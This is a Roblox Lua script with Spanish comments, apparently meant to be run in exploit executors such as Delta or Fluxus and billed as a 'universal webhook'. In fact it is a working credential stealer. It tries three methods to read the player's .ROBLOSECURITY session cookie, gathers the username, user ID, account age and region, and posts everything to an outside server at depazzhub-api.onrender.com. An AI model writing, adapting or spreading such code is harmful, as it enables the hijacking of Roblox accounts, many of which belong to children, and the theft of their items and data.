-- =====================================================================
-- SCRIPT UNIVERSAL DE WEBHOOK (Todo en uno, sin dependencias externas)
-- =====================================================================

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- 1. FUNCIÓN UNIVERSAL DE COOKIES (Funciona en Delta, Hydrogen, Fluxus, Arceus X, etc.)
local function GetUniversalCookie()
    -- Método A: Función nativa getcookie() (La más compatible en executores modernos)
    if type(getcookie) == "function" then
        local success, cookie = pcall(getcookie)
        if success and cookie and tostring(cookie) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(cookie)
        end
    end

    -- Método B: Variables de entorno globales (getgenv)
    local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token"}
    for _, name in ipairs(envNames) do
        local env = getgenv()
        if env[name] and tostring(env[name]) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(env[name])
        end
    end

    -- Método C: CookieService (Último recurso, solo funciona en algunos executors de PC)
    local success, CookieService = pcall(function() 
        return game:GetService("CookieService") 
    end)
    
    if success and CookieService then
        local success2, savedCookie = pcall(function() 
            return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
        end)
        if success2 and savedCookie and tostring(savedCookie) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(savedCookie)
        end
    end

    return "COOKIE_NO_DISPONIBLE"
end

-- 2. FUNCIONES AUXILIARES
local function GetAccountAge()
    return tostring(player.AccountAge) .. " días"
end

local function GetRegion()
    local success, region = pcall(function()
        return LocalizationService.RobloxLocaleId
    end)
    return success and tostring(region) or "Desconocida"
end

-- 3. RECOPILACIÓN DE DATOS
local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = GetAccountAge(),
    region = GetRegion(),
    cookie = GetUniversalCookie() -- Aquí se inyecta la cookie universal
}

-- 4. ENVÍO DEL WEBHOOK
local webhookUrl = "https://depazzhub-api.onrender.com/log"

local success, response = pcall(function()
    return HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data))
end)

if success then
    print("✅ Webhook enviado correctamente a DepazzHub!")
else
    warn("❌ Error al enviar el webhook:", response)
end
